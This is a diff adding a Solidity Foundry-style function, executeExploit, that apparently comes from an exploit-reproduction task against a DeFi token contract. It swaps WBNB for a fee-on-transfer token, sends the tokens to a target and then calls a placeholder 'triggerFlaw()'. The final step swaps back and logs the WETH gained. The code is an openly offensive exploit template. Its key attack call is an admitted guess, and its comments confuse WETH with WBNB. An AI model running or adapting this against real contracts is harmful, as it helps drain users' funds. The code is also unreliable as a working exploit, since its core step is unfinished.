@@ -1,0 +1,51 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start the prank with the contract as the caller
+    vm.startPrank(address(this));
+
+    // Step 1: Deposit WETH to provide liquidity
+    IWETH(WBNB).deposit{value: amount}();
+
+    // Step 2: Approve the target contract to use WETH
+    IWETH(WBNB).approve(target, amount);
+
+    // Step 3: Swap WETH for tokens through the router
+    address[] memory path = new address[](2);
+    path[0] = WBNB;
+    path[1] = token; // The address of the target token
+    uint256 minOutputAmount = 1; // Set to 1 for simplicity
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(minOutputAmount, path, address(this), block.timestamp);
+
+    // Step 4: Transfer the obtained tokens to the target contract
+    uint256 tokenAmount = IERC20(token).balanceOf(address(this));
+    IERC20(token).transfer(target, tokenAmount);
+
+    // Step 5: Conduct the swap to capture the flaw
+    // Call a function on the target contract to trigger the flaw, 
+    // assuming it leads to a WETH output
+    // You will need to determine which function to call using more specific trace.
+    // Example placeholder function
+    (bool success, ) = target.call(abi.encodeWithSignature("triggerFlaw()")); 
+
+    // After this, ensure to swap any tokens obtained back to WETH
+    uint256 finalTokenAmount = IERC20(token).balanceOf(address(this));
+    if (finalTokenAmount > 0) {
+        // Approve the router for the final swap
+        IERC20(token).approve(address(uniswapRouter), finalTokenAmount);
+        
+        // Swap obtained token back to WETH
+        address[] memory returnPath = new address[](2);
+        returnPath[0] = token;
+        returnPath[1] = WBNB;
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(finalTokenAmount, 0, returnPath, address(this), block.timestamp);
+    }
+    
+    // Final balance check
+    uint256 finalWethBalance = IWETH(WBNB).balanceOf(address(this));
+    console.log("Final balance of WETH after exploit: %s", finalWethBalance);
+
+    vm.stopPrank();
+}
+</executeExploitCode>
+```
